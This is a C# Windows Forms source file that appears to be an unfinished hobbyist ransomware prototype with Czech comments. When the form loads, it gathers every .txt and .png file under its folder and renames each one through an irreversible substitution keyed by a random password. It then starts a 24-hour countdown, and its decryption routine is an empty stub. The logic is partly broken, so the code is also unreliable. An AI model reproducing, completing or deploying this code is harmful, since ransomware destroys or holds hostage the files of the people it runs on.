using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Security.AccessControl;

namespace rw2
{
    //JESTE JSEM TO NETESTOVAL A NEBUDU TO TESTOVAT DOKUD TO NEBUDU MIT VE VM, FAKT TO NETESTUJ BEZ TOHO!
    //naser si hovno B) -03.12.2022
    public partial class Form1 : Form
    {
        public int hours = 24, minutes = 0, seconds = 0;
        public Form1()
        {
            InitializeComponent();
        }
        string alphabet = "abcdefghijklmnopqrstuvwxyz";
        string alphabetDecrypted;
        string password;
        public string getRandomString(int minLength, int maxLength)
        {
            Random rnd = new Random();
            string str = string.Empty;
            int length = rnd.Next(minLength, maxLength+1);
            for(int i = 0; i < length; i++)
            {
                str += alphabet[rnd.Next(0, 26)];
            }
            return str;
        }
        public char getCryptedCharacter(string password, char givenChar)
        {
            int vys = 0;
            if(givenChar == '.')
            {
                return givenChar;
            }
            foreach(char character in password)
            {
                vys += (character * givenChar);
            }
            vys %= 25;
            return alphabet[vys];
        }
        public string getCryptedString(string password, string str)
        {
            string vys = string.Empty;
            foreach(char character in str)
            {
                vys += getCryptedCharacter(password, character);
            }
            return vys;
        }
        
        public void encrypce()
        {
            string filePath = System.Reflection.Assembly.GetEntryAssembly().Location;
            filePath =filePath.Remove(filePath.Length - System.AppDomain.CurrentDomain.FriendlyName.Length);
            string[] filePathsTXT = Directory.GetFiles(filePath, "*.txt", SearchOption.AllDirectories);
            string[] filePathsPNG = Directory.GetFiles(filePath, "*.png", SearchOption.AllDirectories);
            List<string> fileNames = new List<string>();
            
            foreach(string file in filePathsTXT)
            {
                fileNames.Add(file.Remove(0, filePath.Length));
            }
            foreach (string file in filePathsPNG)
            {
                fileNames.Add(file.Remove(0, filePath.Length));
            }
            password = getRandomString(10, 25);
            foreach (string file in fileNames)
            {
                File.Move(file, getCryptedString(password, file));
            }


        }
        public void dekrypce()
        {
            string filePath = System.Reflection.Assembly.GetEntryAssembly().Location;
            filePath = filePath.Remove(filePath.Length - System.AppDomain.CurrentDomain.FriendlyName.Length);
            string fileEnd = string.Empty;
            string[] filePaths = Directory.GetFiles(filePath, "*.txt");

        }

        private void button1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            encrypce();
            timer1.Enabled = true;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            seconds--;
            if(seconds < 0)
            {
                minutes--;
                seconds = 59;
                if(minutes < 0)
                {
                    hours--;
                    minutes = 59;
                    if(hours == 0)
                    {
                        timer1.Enabled = false;
                        label1.Text = "Čas vypršel!";
                    }
                }
            }
            label1.Text = hours.ToString() + ":" + minutes.ToString() + ":" + seconds.ToString();
        }
    }
}
